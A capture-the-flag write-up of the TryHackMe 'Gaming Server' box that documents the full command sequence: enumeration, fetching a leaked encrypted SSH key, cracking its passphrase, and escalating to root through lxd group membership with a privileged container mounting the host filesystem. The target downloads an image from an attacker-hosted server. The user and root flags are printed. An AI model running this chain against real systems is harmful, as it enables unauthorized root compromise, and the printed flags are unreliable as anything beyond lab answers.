# TryHackMe — Gaming Server

> A boot2root box revolving around a fictional gaming-lore site ("Draagan"). Web enumeration leaks a username and an encrypted SSH private key, which cracks with a custom wordlist found on the server itself. Privilege escalation goes through a misconfigured `lxd` group membership.

---

## 🗺️ Attack Path Summary

```
Nmap scan (22, 80)
        │
        ▼
Draagan lore website → HTML comment leaks username "john"
        │
        ▼
Feroxbuster → /uploads/ (dict.lst custom wordlist)
           → /secret/secretKey (encrypted RSA private key)
        │
        ▼
ssh2john + john --wordlist=dict.lst → passphrase "letmein"
        │
        ▼
ssh -i secretKey john@target → USER FLAG
        │
        ▼
john is a member of the "lxd" group
        │
        ▼
Build Alpine image (lxd-alpine-builder) → host & transfer to target
        │
        ▼
lxc image import → lxc init --privileged → mount host "/" into container
        │
        ▼
lxc exec bot /bin/sh → root inside container == root on host
        │
        ▼
Read /mnt/root/root/root.txt → ROOT FLAG
```

---

## 1. Reconnaissance — Nmap Scan

```bash
nmap -sV -sC 10.49.180.108
```

<img width="802" height="362" alt="1" src="https://github.com/user-attachments/assets/288d20a8-ee9b-4b53-b02f-198215643f03" />

**Results:**
 
|  Port  | Service |                        Version                           |
|--------|---------|----------------------------------------------------------|
| 22/tcp |   ssh   |              OpenSSH 7.6p1 Ubuntu 4ubuntu0.3             |
| 80/tcp |  http   | Apache httpd 2.4.29 (Ubuntu) — title: *"House of danak"* |

---

## 2. Web Reconnaissance

### The site

<img width="1206" height="646" alt="2-1" src="https://github.com/user-attachments/assets/e404a364-b22f-42fd-8a18-accd74d4507d" />

### A username leaked in the page source

Viewing the page source reveals a developer note left in an HTML comment:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

<img width="757" height="71" alt="2-2" src="https://github.com/user-attachments/assets/13501b30-860b-4593-8c27-6b4a504bf445" />

**Username discovered:** `john`

---

## 3. Content Discovery

```bash
feroxbuster -u http://10.49.180.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1144" height="581" alt="3-1" src="https://github.com/user-attachments/assets/23fa6d94-c5d6-4462-9b48-aa9207cf959c" />

Key hits:

### `/uploads/` — directory listing

<img width="788" height="331" alt="3-2" src="https://github.com/user-attachments/assets/2ca83a49-a4b1-4d46-aa60-b78ad3f3dbf8" />

### `dict.lst` — a custom wordlist

```
http://10.49.180.108/uploads/dict.lst
```

<img width="739" height="290" alt="3-3" src="https://github.com/user-attachments/assets/eb287833-fdf7-4eaf-a90b-273a3ef30902" />

Contains season + year combinations (`Spring2017`, `spring2016`, `Summer2015`, …) — almost certainly left behind as a **custom password wordlist** for this box.

### `/secret/` — directory listing

<img width="704" height="295" alt="3-4" src="https://github.com/user-attachments/assets/5bfca1d9-c920-4b9a-8ad6-7501642ff8bc" />

### `secretKey` — an encrypted private key

```
http://10.49.180.108/secret/secretKey
```

<img width="728" height="546" alt="3-5" src="https://github.com/user-attachments/assets/370085ec-54e4-4af9-a65d-6eb8c7f8ebe5" />

An **AES-encrypted RSA private key** — likely for SSH, and likely protected by a passphrase crackable with the `dict.lst` wordlist found right next to it.

---

## 4. Retrieving the Files

```bash
wget http://10.49.180.108/uploads/dict.lst
wget http://10.49.180.108/secret/secretKey
```

<img width="562" height="406" alt="4" src="https://github.com/user-attachments/assets/98d309bf-f09b-4002-8f07-6900fd4b6f8b" />

Both files pulled to the attacking machine for offline cracking.

---

## 5. Cracking the Private Key Passphrase

Converted the encrypted key into a crackable hash format, then ran `john` against it using the custom wordlist:

```bash
ssh2john secretKey > hash.txt
john hash.txt --wordlist=dict.lst
```

<img width="744" height="274" alt="5" src="https://github.com/user-attachments/assets/aa2acdf0-c240-4892-ace5-a2963989e03a" />

```
letmein           (secretKey)
```

🔑 **Cracked passphrase:** `letmein`

---

## 6. SSH Access

Fixed the key's permissions (required by OpenSSH) and connected as the user found earlier in the HTML comment:

```bash
chmod 600 secretKey
ssh -i secretKey john@10.49.180.108
```

Entered passphrase: `letmein`

<img width="672" height="549" alt="6" src="https://github.com/user-attachments/assets/6cb7ff4b-6b85-4da8-8a1d-6736777d5fbc" />

Foothold achieved as `john`.

---

## 7. Capturing the User Flag

```bash
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
```

<img width="290" height="94" alt="7" src="https://github.com/user-attachments/assets/bf2e80a1-17ca-49d7-a1e3-cd503869b3cc" />

🚩 **User flag:** `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

---

## 8. Privilege Escalation — `lxd` Group Membership

Enumeration of `john`'s group memberships showed membership in the **`lxd`** group — a well-known Linux privilege escalation vector, since LXD-managed containers can be started with `security.privileged=true` and can mount the host's root filesystem into the container, giving full read/write access to the host as root.

### Building a minimal Alpine LXD image (attacker machine)

```bash
cd alpine
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```

<img width="736" height="502" alt="8" src="https://github.com/user-attachments/assets/8c6437c3-1be3-47c4-87dd-758e2aba9675" />

### Serving the built image

```bash
ls
# alpine-v3.24-i686-20261106_0242.tar.gz
python3 -m http.server
```

<img width="994" height="138" alt="8-2" src="https://github.com/user-attachments/assets/da58be8c-ba4b-4fc2-b9c4-f13b5b884b8e" />

### Pulling the image onto the target

```bash
john@exploitable:~/bot$ wget http://192.168.137.77:8000/alpine-v3.24-i686-20261106_0242.tar.gz
```

<img width="789" height="225" alt="8-3" src="https://github.com/user-attachments/assets/ee9ba9de-aa6e-4284-b328-c7edeacd3056" />

### Importing the image and creating a privileged container

```bash
lxc image import alpine-v3.24-i686-20261106_0242.tar.gz --alias alpine
lxc image list
lxc init alpine bot -c security.privileged=true
```

<img width="925" height="196" alt="9-1" src="https://github.com/user-attachments/assets/f37764f4-233f-40fc-ad89-3c847265f429" />

### Mounting the host filesystem and getting a root shell

```bash
lxc config device add bot host-root disk source=/ path=/mnt/root recursive=true
lxc start bot
lxc exec bot /bin/sh
```

<img width="859" height="156" alt="9-2" src="https://github.com/user-attachments/assets/ddcfaa3f-e2b0-44f3-ba87-ddd919876866" />


Because the container is privileged and the host's `/` is bind-mounted at `/mnt/root`, this root inside the container is equivalent to **root on the host filesystem**.

---

## 9. Capturing the Root Flag



<img width="467" height="118" alt="10" src="https://github.com/user-attachments/assets/659017d8-f53e-4ad7-bc25-dbf82609a66c" />

🚩 **Root flag:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`
